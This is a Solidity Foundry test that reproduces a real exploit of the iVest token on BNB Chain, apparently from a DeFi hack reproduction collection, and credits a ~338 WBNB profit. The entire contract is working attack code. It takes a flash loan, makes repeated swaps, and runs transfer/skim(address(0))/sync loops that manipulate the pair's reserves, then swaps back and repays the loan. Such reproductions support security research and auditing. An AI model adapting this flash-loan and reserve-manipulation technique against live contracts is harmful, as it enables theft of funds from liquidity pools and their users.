// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// TX : https://app.blocksec.com/explorer/tx/bsc/0x12f27e81e54684146ec50973ea94881c535887c2e2f30911b3402a55d67d121d
// GUY : https://x.com/AnciliaInc/status/1822870201698050064
// Profit : ~ 338 WBNB
// REASON : Business logic flaw

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 iVest  = IERC20(0x786fCF76dC44B29845f284B81f5680b6c47302c6);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 constant iVest_pair = Uni_Pair_V2(0x2607118D363789f841d952f02e359BFa483955f9);
    uint256 borrow_amount;
    function setUp() external 
    {
        cheats.createSelectFork("bsc", 41289497);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
        borrow_amount = 1200 ether;
        pool.flash(address(this),0,borrow_amount,"");
        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {
        uint256 i = 0; 
        while(i<30){
            swap_token_to_token(address(WBNB),address(iVest),40 ether);
            i++;
        }
        i = 0;
        while(i<3){
            iVest.transfer(address(iVest_pair),100_000_000_000);
            iVest_pair.skim(address(0));
            iVest_pair.sync();
            i++;
        }
        iVest.transfer(address(iVest_pair),13_520_128_050);
        iVest_pair.skim(address(0));
        iVest_pair.sync();
        //whale fee here,need some calculate.Swap all remain token will lead to error.may be the contract
        //will use more token than you transfer.
        swap_token_to_token(address(iVest),address(WBNB),30820994590); 
        WBNB.transfer(address(pool),borrow_amount+fee1);
    }

    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {
        // payable(address(MARS)).transfer(address(this).balance);
    }


}

